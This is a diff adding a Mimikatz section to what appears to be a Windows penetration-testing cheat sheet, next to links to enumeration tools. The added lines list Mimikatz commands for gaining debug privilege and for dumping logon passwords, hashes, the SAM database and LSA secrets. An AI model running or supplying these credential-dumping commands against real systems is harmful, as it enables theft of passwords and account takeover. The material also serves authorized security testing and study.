@@ -3,6 +3,7 @@
 
 - [Windows](#windows)
   - [Enumeration](#enumeration-on-windows)
+  - [Mimikatz](#mimikatz)
   - [Other](#other)
   - [Privilege Escalation](#)
 
@@ -12,6 +13,23 @@ Automated enumeration tools:
 - [Seatbelt](https://github.com/GhostPack/Seatbelt)
 - [SharpUp](https://github.com/GhostPack/SharpUp)
 - [Watson](https://github.com/rasta-mouse/Watson)
+
+## Mimikatz
+- [mimikatz](https://github.com/gentilkiwi/mimikatz)
+
+### Check for correct privilege
+```bash
+mimikatz $ privilege::debug
+```
+
+### Extract logon passwords / hashes
+```bash
+mimikatz $ sekurlsa::logonpasswords
+# OR
+mimikatz $ lsadump::sam
+# OR
+mimikatz $ lsadump::secrets
+```
 
 ## Other
 Some useful stuff.
